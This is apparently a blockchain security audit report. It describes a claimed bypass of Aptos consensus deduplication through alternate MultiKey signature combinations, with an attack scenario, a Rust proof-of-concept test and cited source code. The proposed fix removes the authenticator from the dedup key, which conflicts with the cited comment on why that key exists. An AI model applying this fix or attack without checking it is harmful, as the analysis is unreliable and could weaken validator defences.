# Audit Report

## Title
MultiKey Signature Malleability Bypasses Consensus Deduplication Logic

## Summary
The consensus deduplication mechanism fails to properly deduplicate semantically identical transactions that differ only in their MultiKey/MultiEd25519 signature combinations. This allows an attacker with a threshold multisig account to create multiple distinct `committed_hash` values for the same transaction, bypassing the `TxnHashAndAuthenticatorDeduper` and consuming excessive block space.

## Finding Description

The vulnerability stems from how `committed_hash()` is calculated for `SignedTransaction` objects. The hash includes the entire transaction authenticator, which for MultiKey/MultiEd25519 schemes can vary while remaining cryptographically valid.

**Root Cause:** [1](#0-0) 

The `committed_hash()` method wraps the entire `SignedTransaction` (including authenticator) into a `Transaction::UserTransaction` variant and hashes it via BCS serialization: [2](#0-1) 

For a k-of-n MultiKey authenticator, there are C(n,k) distinct valid signature combinations. Each combination produces a different `signatures_bitmap` and `signatures` vector: [3](#0-2) 

**Deduplication Bypass:**

The consensus deduplication logic identifies "possible duplicates" by `(sender, replay_protector)` but then filters using `(committed_hash, authenticator)` pairs: [4](#0-3) 

Since different signature combinations produce different authenticators AND different hashes (because the hash includes the authenticator), the `HashSet.insert()` on line 82 succeeds for all versions, and NONE are filtered out.

The code comment explicitly states deduplication happens before signature verification: [5](#0-4) 

**Attack Scenario:**

1. Attacker controls a 3-of-5 MultiKey account
2. Creates transaction T (e.g., transfer 1 APT, sequence number N)
3. Signs with keys {0,1,2} → T_A with hash H_A
4. Signs with keys {0,1,3} → T_B with hash H_B  
5. Submits T_A to validator V1, T_B to validator V2 before mempool gossip converges
6. Block proposer includes batches from both validators
7. Deduplication sees `(sender, N)` match but `(H_A, auth_A) ≠ (H_B, auth_B)`
8. Both pass through to execution
9. One executes successfully, other fails with `SEQUENCE_NUMBER_TOO_OLD`

## Impact Explanation

This is a **Medium severity** vulnerability per Aptos bug bounty criteria:

- **Block Space Waste**: For a k-of-n multisig, C(n,k) duplicate versions can consume block space (e.g., 3-of-5 = 10 combinations, 5-of-8 = 56 combinations)
- **Validator Resource Exhaustion**: All versions go through deduplication, consensus, and execution before failing
- **State Inconsistency Risk**: While execution prevents double-spending, the presence of failed transactions in blocks creates operational overhead

This does NOT reach Critical severity because:
- No consensus safety violation (all nodes commit identical blocks)
- No fund loss (execution-level sequence number check prevents double-spending)
- Mempool-level deduplication prevents unlimited accumulation per validator [6](#0-5) 

## Likelihood Explanation

**Moderate likelihood** - requires:
- Attacker controls a MultiKey/MultiEd25519 account (common for institutional users)
- Precise timing to inject different versions into different validators before gossip converges
- Block proposer includes batches from multiple validators

The attack is feasible but requires coordination. A sophisticated attacker could automate version distribution across validators.

## Recommendation

Modify the deduplication logic to use only the raw transaction hash (excluding authenticator) when identifying duplicates, since the raw transaction captures the semantic intent:

```rust
// In txn_hash_and_authenticator_deduper.rs
let hash_and_authenticators: Vec<_> = possible_duplicates
    .into_par_iter()
    .zip(&transactions)
    .map(|(need_hash, txn)| match need_hash {
        // Use raw_txn hash instead of committed_hash
        true => Some(txn.raw_transaction_ref().hash()),
        false => None,
    })
    .collect();
```

Alternatively, normalize MultiKey signatures by requiring signatures to be provided in canonical order (sorted by index) during deserialization.

## Proof of Concept

```rust
use aptos_crypto::ed25519::{Ed25519PrivateKey, Ed25519PublicKey};
use aptos_types::{
    transaction::{
        authenticator::{AccountAuthenticator, AnyPublicKey, AnySignature, MultiKey, MultiKeyAuthenticator, SingleKeyAuthenticator},
        RawTransaction, ReplayProtector, Script, SignedTransaction, TransactionAuthenticator, TransactionExecutable,
    },
    chain_id::ChainId,
    account_address::AccountAddress,
};
use aptos_keygen::KeyGen;

fn test_multisig_hash_malleability() {
    // Create 5 key pairs
    let mut keys = vec![];
    for _ in 0..5 {
        let (priv_key, pub_key) = KeyGen::from_os_rng().generate_ed25519_keypair();
        keys.push((priv_key, pub_key));
    }
    
    // Create 3-of-5 MultiKey
    let public_keys: Vec<AnyPublicKey> = keys.iter()
        .map(|(_, pk)| AnyPublicKey::ed25519(pk.clone()))
        .collect();
    let multi_key = MultiKey::new(public_keys, 3).unwrap();
    
    // Create raw transaction
    let raw_txn = RawTransaction::new_txn(
        AccountAddress::random(),
        ReplayProtector::SequenceNumber(0),
        TransactionExecutable::Script(Script::new(vec![], vec![], vec![])),
        None,
        100000,
        1,
        u64::MAX,
        ChainId::new(1),
    );
    
    // Sign with keys {0,1,2}
    let sigs_a: Vec<(u8, AnySignature)> = vec![
        (0, AnySignature::ed25519(keys[0].0.sign(&raw_txn).unwrap())),
        (1, AnySignature::ed25519(keys[1].0.sign(&raw_txn).unwrap())),
        (2, AnySignature::ed25519(keys[2].0.sign(&raw_txn).unwrap())),
    ];
    let auth_a = TransactionAuthenticator::SingleSender {
        sender: AccountAuthenticator::MultiKey {
            authenticator: MultiKeyAuthenticator::new(multi_key.clone(), sigs_a).unwrap()
        }
    };
    let txn_a = SignedTransaction::new_signed_transaction(raw_txn.clone(), auth_a);
    
    // Sign with keys {0,1,3} - different combination!
    let sigs_b: Vec<(u8, AnySignature)> = vec![
        (0, AnySignature::ed25519(keys[0].0.sign(&raw_txn).unwrap())),
        (1, AnySignature::ed25519(keys[1].0.sign(&raw_txn).unwrap())),
        (3, AnySignature::ed25519(keys[3].0.sign(&raw_txn).unwrap())),
    ];
    let auth_b = TransactionAuthenticator::SingleSender {
        sender: AccountAuthenticator::MultiKey {
            authenticator: MultiKeyAuthenticator::new(multi_key, sigs_b).unwrap()
        }
    };
    let txn_b = SignedTransaction::new_signed_transaction(raw_txn, auth_b);
    
    // Verify different hashes!
    assert_ne!(txn_a.committed_hash(), txn_b.committed_hash());
    
    // Test deduplication
    let deduper = TxnHashAndAuthenticatorDeduper::new();
    let txns = vec![txn_a.clone(), txn_b.clone()];
    let deduped = deduper.dedup(txns);
    
    // VULNERABILITY: Both transactions pass through!
    assert_eq!(deduped.len(), 2);
}
```

**Notes:**
- While mempool-level deduplication provides partial mitigation by preventing unlimited accumulation per validator, the consensus-level deduplication bypass still allows block space waste when different validators hold different versions
- The attack complexity and limited impact place this at Medium severity rather than Critical

### Citations

**File:** types/src/transaction/mod.rs (L1335-1339)
```rust
    pub fn committed_hash(&self) -> HashValue {
        *self
            .committed_hash
            .get_or_init(|| Transaction::UserTransaction(self.clone()).hash())
    }
```

**File:** types/src/transaction/mod.rs (L2945-2951)
```rust
#[derive(Clone, Debug, Eq, PartialEq, Serialize, Deserialize, CryptoHasher, BCSCryptoHash)]
pub enum Transaction {
    /// Transaction submitted by the user. e.g: P2P payment transaction, publishing module
    /// transaction, etc.
    /// TODO: We need to rename SignedTransaction to SignedUserTransaction, as well as all the other
    ///       transaction types we had in our codebase.
    UserTransaction(SignedTransaction),
```

**File:** types/src/transaction/authenticator.rs (L1026-1064)
```rust
pub struct MultiKeyAuthenticator {
    public_keys: MultiKey,
    signatures: Vec<AnySignature>,
    signatures_bitmap: aptos_bitvec::BitVec,
}

impl MultiKeyAuthenticator {
    pub fn new(public_keys: MultiKey, signatures: Vec<(u8, AnySignature)>) -> Result<Self> {
        ensure!(
            public_keys.len() < (u8::MAX as usize),
            "Too many public keys, {}, in MultiKeyAuthenticator.",
            public_keys.len(),
        );

        let mut signatures_bitmap = aptos_bitvec::BitVec::with_num_bits(public_keys.len() as u16);
        let mut any_signatures = vec![];

        for (idx, signature) in signatures {
            ensure!(
                (idx as usize) < public_keys.len(),
                "Signature index is out of public key range, {} < {}.",
                idx,
                public_keys.len(),
            );
            ensure!(
                !signatures_bitmap.is_set(idx as u16),
                "Duplicate signature index, {}.",
                idx
            );
            signatures_bitmap.set(idx as u16);
            any_signatures.push(signature);
        }

        Ok(MultiKeyAuthenticator {
            public_keys,
            signatures: any_signatures,
            signatures_bitmap,
        })
    }
```

**File:** consensus/src/txn_hash_and_authenticator_deduper.rs (L14-17)
```rust
/// (raw_txn.hash(), authenticator). Both the hash and signature are required because dedup
/// happens before signatures are verified and transaction prologue is checked. (So, e.g., a bad
/// transaction could contain a txn and signature that are unrelated.) If the checks are done
/// beforehand only one of the txn hash or signature would be required.
```

**File:** consensus/src/txn_hash_and_authenticator_deduper.rs (L44-90)
```rust
        for (i, txn) in transactions.iter().enumerate() {
            match seen.get(&(txn.sender(), txn.replay_protector())) {
                None => {
                    seen.insert((txn.sender(), txn.replay_protector()), i);
                },
                Some(first_index) => {
                    is_possible_duplicate = true;
                    possible_duplicates[*first_index] = true;
                    possible_duplicates[i] = true;
                },
            }
        }
        if !is_possible_duplicate {
            TXN_DEDUP_FILTERED.observe(0 as f64);
            return transactions;
        }

        let num_txns = transactions.len();

        let hash_and_authenticators: Vec<_> = possible_duplicates
            .into_par_iter()
            .zip(&transactions)
            .with_min_len(optimal_min_len(num_txns, 48))
            .map(|(need_hash, txn)| match need_hash {
                true => Some((txn.committed_hash(), txn.authenticator())),
                false => None,
            })
            .collect();

        // TODO: Possibly parallelize. See struct comment.
        let mut seen_hashes = HashSet::new();
        let mut num_duplicates: usize = 0;
        let filtered: Vec<_> = hash_and_authenticators
            .into_iter()
            .zip(transactions)
            .filter_map(|(maybe_hash, txn)| match maybe_hash {
                None => Some(txn),
                Some(hash_and_authenticator) => {
                    if seen_hashes.insert(hash_and_authenticator) {
                        Some(txn)
                    } else {
                        num_duplicates += 1;
                        None
                    }
                },
            })
            .collect();
```

**File:** mempool/src/core_mempool/transaction_store.rs (L256-293)
```rust
        if let Some(txns) = self.transactions.get_mut(&address) {
            if let Some(current_version) = txns.get_mut(&txn_replay_protector) {
                if current_version.txn.payload() != txn.txn.payload() {
                    return MempoolStatus::new(MempoolStatusCode::InvalidUpdate).with_message(
                        "Transaction already in mempool with a different payload".to_string(),
                    );
                } else if current_version.txn.expiration_timestamp_secs()
                    != txn.txn.expiration_timestamp_secs()
                {
                    return MempoolStatus::new(MempoolStatusCode::InvalidUpdate).with_message(
                        "Transaction already in mempool with a different expiration timestamp"
                            .to_string(),
                    );
                } else if current_version.txn.max_gas_amount() != txn.txn.max_gas_amount() {
                    return MempoolStatus::new(MempoolStatusCode::InvalidUpdate).with_message(
                        "Transaction already in mempool with a different max gas amount"
                            .to_string(),
                    );
                } else if current_version.get_gas_price() < txn.get_gas_price() {
                    // Update txn if gas unit price is a larger value than before
                    if let Some(txn) = txns.remove(&txn_replay_protector) {
                        self.index_remove(&txn);
                    };
                    counters::CORE_MEMPOOL_GAS_UPGRADED_TXNS.inc();
                } else if current_version.get_gas_price() > txn.get_gas_price() {
                    return MempoolStatus::new(MempoolStatusCode::InvalidUpdate).with_message(
                        "Transaction already in mempool with a higher gas price".to_string(),
                    );
                } else {
                    // If the transaction is the same, it's an idempotent call
                    // Updating signers is not supported, the previous submission must fail
                    counters::CORE_MEMPOOL_IDEMPOTENT_TXNS.inc();
                    if let Some(acc_seq_num) = account_sequence_number {
                        self.process_ready_seq_num_based_transactions(&address, acc_seq_num);
                    }
                    return MempoolStatus::new(MempoolStatusCode::Accepted);
                }
            }
```
